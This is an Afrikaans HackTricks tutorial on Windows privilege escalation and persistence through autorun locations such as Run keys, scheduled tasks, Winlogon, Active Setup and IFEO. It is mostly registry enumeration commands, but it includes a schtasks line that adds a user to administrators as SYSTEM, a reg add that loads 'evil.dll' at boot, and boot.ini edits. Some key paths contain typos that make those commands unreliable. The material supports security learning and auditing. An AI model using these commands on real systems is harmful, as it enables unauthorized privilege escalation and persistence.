# Voorregverhoging met Autoruns

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende skriftelike en gesproke Pools vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** kan gebruik word om programme te hardloop by **opstart**. Sien watter binaire lêers geprogrammeer is om by opstart uitgevoer te word met:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geskeduleerde Take

**Take** kan geskeduleer word om met 'n **sekere frekwensie** uitgevoer te word. Sien watter binêre lêers geskeduleer is om uitgevoer te word met:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Gidse

Alle binaire lêers wat in die **Startup-gidse geleë is, sal by opstart uitgevoer word**. Die algemene startup-gidse is diegene wat hieronder volg, maar die startup-gids word in die register aangedui. [Lees dit om te leer waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Register

{% hint style="info" %}
[Nota vanaf hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node**-registerinskrywing dui aan dat jy 'n 64-bis Windows-weergawe gebruik. Die bedryfstelsel gebruik hierdie sleutel om 'n afsonderlike weergawe van HKEY\_LOCAL\_MACHINE\SOFTWARE vir 32-bis-toepassings wat op 64-bis Windows-weergawes loop, te vertoon.
{% endhint %}

### Uitvoerings

**Gewoonlik bekende** AutoRun-register:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registerinskrywings wat bekend staan as **Run** en **RunOnce** is ontwerp om outomaties programme uit te voer elke keer as 'n gebruiker by die stelsel aanmeld. Die opdraglyn wat as 'n sleutel se datawaarde toegewys is, is beperk tot 260 karakters of minder.

**Diensuitvoerings** (kan outomatiese aanvang van dienste tydens opstart beheer):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Op Windows Vista en latere weergawes word die **Run** en **RunOnce** registerleutels nie outomaties gegenereer nie. Inskrywings in hierdie sleutels kan programme direk begin of hulle as afhanklikhede spesifiseer. Byvoorbeeld, om 'n DLL-lêer by aanmelding te laai, kan die **RunOnceEx**-registerleutel saam met 'n "Depend" sleutel gebruik word. Dit word gedemonstreer deur 'n registerinskrywing by te voeg om "C:\\temp\\evil.dll" uit te voer tydens die stelselopstart:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: As jy binne enige van die genoemde registries binne **HKLM** kan skryf, kan jy voorregte verhoog wanneer 'n ander gebruiker inteken.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: As jy enige van die binêre lêers wat aangedui word in enige van die registries binne **HKLM** kan oorskryf, kan jy daardie binêre lêer met 'n agterdeur wysig wanneer 'n ander gebruiker inteken en voorregte verhoog.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Beginpadroete

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skakels wat in die **Beginpad**-vouer geplaas word, sal outomaties dienste of toepassings aktiveer om te begin tydens gebruikersaanmelding of stelselherlaai. Die ligging van die **Beginpad**-vouer word in die register vir beide die **Plaaslike Masjien** en **Huidige Gebruiker** omvang gedefinieer. Dit beteken dat enige skakel wat by hierdie gespesifiseerde **Beginpad**-liggings gevoeg word, verseker dat die gekoppelde diens of program begin nadat die aanmeldings- of herlaaiproses voltooi is. Dit maak dit 'n eenvoudige metode om programme outomaties te skeduleer om te begin.

{% hint style="info" %}
As jy enige \[Gebruiker] Skulpad onder **HKLM** kan oorskryf, sal jy dit kan rig na 'n vouer wat deur jou beheer word en 'n agterdeur plaas wat elke keer as 'n gebruiker in die stelsel aanmeld, uitgevoer sal word en voorregte sal verhoog.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Sleutels

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Gewoonlik is die **Userinit** sleutel ingestel op **userinit.exe**. Indien hierdie sleutel gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** uitgevoer word wanneer die gebruiker aanmeld. Op dieselfde manier is die **Shell** sleutel bedoel om na **explorer.exe** te verwys, wat die verstekskulp vir Windows is.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
As jy die registerwaarde of die binêre lêer kan oorskryf, sal jy in staat wees om voorregte te verhoog.
{% endhint %}

### Beleidsinstellings

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kyk na die **Run** sleutel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### Alternatiewe Skulp

### Verander die Veilige Modus Opdragvenster

In die Windows-register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar 'n **`AlternateShell`** waarde wat standaard na `cmd.exe` ingestel is. Dit beteken wanneer jy "Veilige Modus met Opdragvenster" kies tydens opstart (deur F8 te druk), word `cmd.exe` gebruik. Maar, dit is moontlik om jou rekenaar so in te stel dat dit outomaties in hierdie modus begin sonder om F8 te druk en dit handmatig te kies.

Stappe om 'n opstartopsie te skep vir outomatiese begin in "Veilige Modus met Opdragvenster":

1. Verander die eienskappe van die `boot.ini` lêer om die skryfbeskerming, stelsel en verborge vlae te verwyder: `attrib c:\boot.ini -r -s -h`
2. Maak `boot.ini` oop vir wysiging.
3. Voeg 'n lyn soos hierdie in: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor die veranderinge in `boot.ini`.
5. Pas die oorspronklike lêereienskappe weer toe: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Die verandering van die **AlternateShell** register sleutel maak dit moontlik om 'n aangepaste opdragvenster op te stel, moontlik vir ongemagtigde toegang.
- **Exploit 2 (PAD Skryfregte):** Skryfregte na enige deel van die stelsel se **PAD** veranderlike, veral voor `C:\Windows\system32`, stel jou in staat om 'n aangepaste `cmd.exe` uit te voer, wat 'n agterdeur kan wees as die stelsel in Veilige Modus begin.
- **Exploit 3 (PAD en boot.ini Skryfregte):** Skryftoegang tot `boot.ini` maak outomatiese Veilige Modus opstart moontlik, wat ongemagtigde toegang op die volgende herlaai fasiliteer.

Om die huidige **AlternateShell** instelling te kontroleer, gebruik hierdie opdragte:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Geïnstalleerde Komponent

Aktiewe Opstelling is 'n funksie in Windows wat **geïnisieer word voordat die lessenaaromgewing volledig gelaai is**. Dit gee prioriteit aan die uitvoering van sekere opdragte wat voltooi moet word voordat die gebruikersaanmelding voortgaan. Hierdie proses vind selfs plaas voordat ander opstartinskrywings, soos dié in die Run of RunOnce-registernommers, geaktiveer word.

Aktiewe Opstelling word bestuur deur die volgende registernommers:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie nommers bestaan verskeie subnommers, elk wat ooreenstem met 'n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:

- **IsInstalled:**
- `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
- `1` beteken dat die opdrag een keer vir elke gebruiker uitgevoer sal word, wat die verstekgedrag is as die `IsInstalled`-waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Aktiewe Opstelling uitgevoer moet word. Dit kan enige geldige opdraglyn wees, soos die begin van `notepad`.

**Veiligheidsinsigte:**

- Die wysiging of skryf na 'n sleutel waar **`IsInstalled`** op `"1"` ingestel is met 'n spesifieke **`StubPath`** kan lei tot ongemagtigde opdraguitvoering, moontlik vir voorregverhoging.
- Die verandering van die binêre lêer waarna verwys word in enige **`StubPath`**-waarde kan ook voorregverhoging bewerkstellig, mits voldoende regte.

Om die **`StubPath`**-konfigurasies oor Aktiewe Opstelling komponente te ondersoek, kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Blaaierhulpprogramme-voorwerpe

### Oorsig van Blaaierhulpprogramme-voorwerpe (BHO's)

Blaaierhulpprogramme-voorwerpe (BHO's) is DLL-modules wat ekstra funksies byvoeg aan Microsoft se Internet Explorer. Hulle laai in Internet Explorer en Windows Explorer by elke begin. Tog kan hulle uitvoering geblokkeer word deur die **NoExplorer** sleutel na 1 te stel, wat voorkom dat hulle saam met Windows Explorer-instanties laai.

BHO's is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge nie, die verstekblaaier in nuwer weergawes van Windows.

Om BHO's wat op 'n stelsel geregistreer is te verken, kan jy die volgende registerkodes ondersoek:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word verteenwoordig deur sy **CLSID** in die register, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Vir die ondervraging van BHO's in die register kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer-uitbreidings

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Let daarop dat die register 1 nuwe register per dll sal bevat en dit sal verteenwoordig word deur die **CLSID**. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Lettertipebestuurders

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Oopmaakopdrag

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Beeldlêr Uitvoeringsopsies

Die Beeldlêr Uitvoeringsopsies is 'n funksie in Windows wat gebruik kan word vir bevoorregte eskalasie. Dit stel ons in staat om 'n uitvoerbare lêer te koppel aan 'n spesifieke toepassing. Wanneer die toepassing gestart word, sal die gekoppelde uitvoerbare lêer ook uitgevoer word. Hierdie funksie kan gebruik word om 'n outomatiese bevoorregte uitvoering van 'n lêer te bewerkstellig.

Om hierdie tegniek te gebruik, moet ons die Register redigeer. Ons moet die sleutel `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` vind en 'n nuwe sleutel met die naam van die teiken toepassing skep. Binne hierdie nuwe sleutel moet ons 'n waarde met die naam `Debugger` skep en die pad na die uitvoerbare lêer wat ons wil uitvoer, as die waarde invoer.

Wanneer die teiken toepassing nou gestart word, sal die gekoppelde uitvoerbare lêer ook uitgevoer word. Dit kan gebruik word om bevoorregte aksies uit te voer, aangesien die uitvoering van die gekoppelde lêer plaasvind met die bevoorregte konteks van die toepassing.

Dit is belangrik om op te let dat hierdie tegniek nie altyd werk nie, aangesien sommige toepassings dit kan verhoed deur die sleutel `Debugger` te ignoreer.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Let daarop dat al die webwerwe waar jy autoruns kan vind, **reeds deur** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) gesoek is. Vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy egter [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) vanaf SysInternals gebruik:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Meer

**Vind meer Autoruns soos registries in [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Verwysings

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hacking loopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende skriftelike en mondelinge Pools vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
